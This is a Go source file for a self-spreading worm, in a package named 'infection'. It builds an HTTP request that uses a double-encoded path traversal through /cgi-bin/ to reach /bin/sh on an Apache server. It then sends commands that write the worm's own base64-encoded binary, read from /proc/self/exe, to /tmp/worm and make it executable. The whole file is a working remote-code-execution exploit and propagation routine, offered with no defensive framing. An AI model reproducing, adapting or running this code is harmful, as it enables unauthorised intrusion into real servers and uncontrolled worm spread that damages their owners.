package infection

import (
	"io/ioutil"
	"log"
	"fmt"
	"net"
	"encoding/base64"
)

var (
	path = "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh"
	copyCommandsTemplate = "echo;echo '%s' | base64 -d > %s;chmod u+x %s;"
	wormPath = "/tmp/worm"
)

func PrepareRequest(ip string, commands string) string {
	rt := fmt.Sprintf("POST %s HTTP/1.1\r\n", path)
	rt += fmt.Sprintf("Host: %s\r\n", ip)
	rt += fmt.Sprintf("Connection: close\r\n")
	rt += fmt.Sprintf("Content-Type: text/plain\r\n")
	rt += fmt.Sprintf("Content-Length: %d\r\n",len(commands))
	rt += fmt.Sprintf("\r\n")
	rt += fmt.Sprintf("%s\r\n",commands)
	return rt
}

func ApacheInfect(ip string, port string) string {
	var worm []byte
	worm = GetFile("/proc/self/exe")
	worm64 := base64.StdEncoding.EncodeToString(worm)
	commands := fmt.Sprintf(copyCommandsTemplate,worm64,wormPath,wormPath)
	conn, err := net.Dial("tcp", ip+":"+port)
	rt := PrepareRequest(ip, commands)
	_, err = conn.Write([]byte(rt))
    if err != nil {
        log.Fatal(err)
    }

    resp, err := ioutil.ReadAll(conn)
    if err != nil {
        log.Fatal(err)
    }
    conn.Close()
	return string(resp)
}